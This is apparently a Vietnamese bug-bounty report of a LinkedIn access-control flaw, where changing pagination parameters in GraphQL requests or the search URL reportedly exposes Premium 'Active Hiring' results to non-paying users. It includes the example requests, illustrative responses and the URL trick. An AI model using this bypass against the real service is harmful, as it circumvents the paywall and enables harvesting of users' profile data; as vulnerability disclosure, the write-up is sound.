
**Loại lỗi:** Business Logic / Access Control (CWE-284)

---

## Tóm tắt ngắn gọn

Người **không có LinkedIn Premium** vẫn xem được **toàn bộ kết quả filter “Active Hiring” (tính năng trả phí)** bằng cách **thao túng phân trang**. Backend **không kiểm tra trạng thái Premium khi thay đổi tham số pagination**, dẫn đến bypass paywall.

---

## Các bước (dễ hiểu)

1. Tài khoản **không có Premium**
2. Thực hiện tìm kiếm People với filter **Active Hiring**
3. UI chỉ cho xem vài kết quả đầu → hiện popup yêu cầu mua Premium
4. Thay đổi **pagination** (`start`, `page`) trong request / URL
5. Backend trả về **toàn bộ kết quả premium** ❌

---

## Bản chất lỗi

* **Access control chỉ enforced ở UI**
* **API GraphQL không validate quyền Premium khi `start > 0`**
* Quyền truy cập dữ liệu trả phí **không được kiểm tra nhất quán**

---

## Ví dụ khai thác qua GraphQL API

**Improper Access Control – Premium “Active Hiring”**

---

## 1️⃣ Request đúng → Response đúng (hành vi mong đợi)

### Request (Non-Premium user, request đầu tiên)

```
POST /voyager/api/graphql
{
  "query": "PeopleSearch",
  "variables": {
    "filters": {
      "activeHiring": true
    },
    "start": 0,
    "count": 10
  }
}
```

### Response đúng

```
403 Forbidden
{
  "error": "Premium subscription required to view Active Hiring results"
}
```

👉 Backend **chặn truy cập** vì user không có Premium.

---

## 2️⃣ Request bug → Response bug (hành vi sai)

### Request (Non-Premium user, thay đổi pagination)

```
POST /voyager/api/graphql
{
  "query": "PeopleSearch",
  "variables": {
    "filters": {
      "activeHiring": true
    },
    "start": 25,
    "count": 10
  }
}
```

### Response bug

```
200 OK
{
  "data": {
    "searchResults": [
      { "name": "Alice", "activeHiring": true },
      { "name": "Bob", "activeHiring": true }
    ]
  }
}
```

👉 **Không kiểm tra Premium khi `start > 0` → bypass paywall**


---

## Bypass đơn giản qua URL (không cần kỹ thuật)

### URL ban đầu (UI giới hạn)

```
https://www.linkedin.com/search/results/people/?activeHiring=true
```

### Thêm phân trang

```
https://www.linkedin.com/search/results/people/?activeHiring=true&page=2
```

➡️ Vẫn xem được kết quả premium ❌

---

## Tác động

* Bypass mô hình **thu phí Premium**
* Harvest dữ liệu giá trị cao (Active Hiring profiles)
* Ảnh hưởng trực tiếp đến **doanh thu & trust model**

---

## Mapping

* **CWE-284:** Improper Access Control
* **OWASP:** A01 – Broken Access Control
* **Bug class:** Paywall / Subscription bypass

